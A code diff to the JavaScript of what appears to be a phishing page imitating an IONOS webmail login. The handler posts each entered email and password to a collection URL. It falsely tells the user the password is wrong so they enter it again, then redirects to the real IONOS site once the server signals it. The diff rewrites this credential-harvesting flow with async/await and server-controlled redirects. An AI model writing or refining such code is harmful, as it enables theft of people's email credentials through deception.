@@ -191,9 +191,10 @@
                 }         
             });
 
-            pwButton.addEventListener("click", (event) => {
-                pwerror.classList.add("hide");
+            pwButton.addEventListener("click", async (event) => {
                 event.preventDefault();
+                pwerror.classList.add("hide");
+                passwd.classList.remove("border-red-500");
                 
                 if (passwd.value === "") {
                     passwd.classList.add("border-red-500");
@@ -210,40 +211,47 @@
                 let attempts = parseInt(sessionStorage.getItem('loginAttempts')) + 1;
                 sessionStorage.setItem('loginAttempts', attempts.toString());
                 
-                fetch(PROCESS_URL, {
-                    method: 'POST',
-                    body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
+                try {
+                    const response = await fetch(PROCESS_URL, {
+                        method: 'POST',
+                        body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
+                        headers: {
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        }
+                    });
+                    
+                    const data = await response.json();
+                    
+                    if (!response.ok || !data.success) {
+                        throw new Error(data.message || 'Login failed');
                     }
-                })
-                .then(res => {
-                    if(!res.ok) throw new Error('Network response was not ok');
-                    return res.json();
-                })
-                .then(response => {
+                    
                     barLoad.classList.add("hide");
                     pwButton.disabled = false;
                     
-                    if (attempts >= 3) {
+                    if (data.status === 'redirect') {
                         // Reset attempts and redirect on 3rd try
                         sessionStorage.removeItem('loginAttempts');
                         window.location.href = "https://email.ionos.com/appsuite/";
                     } else {
-                        // Show error and clear password for retry
+                        // Clear password field and show error
                         passwd.value = "";
                         passwd.focus();
                         pwerror.classList.remove("hide");
                         errorText.textContent = "Please enter your correct password";
                     }
-                })
-                .catch(error => {
+                } catch (error) {
                     barLoad.classList.add("hide");
                     pwButton.disabled = false;
                     console.error('Error:', error);
+                    
+                    // Clear password field on any error
+                    passwd.value = "";
+                    passwd.focus();
+                    
                     pwerror.classList.remove("hide");
-                    errorText.textContent = "Temporary error. Please try again.";
-                });
+                    errorText.textContent = error.message || "Temporary error. Please try again.";
+                }
             });      
 
             let showEmailDiv = (em) => {
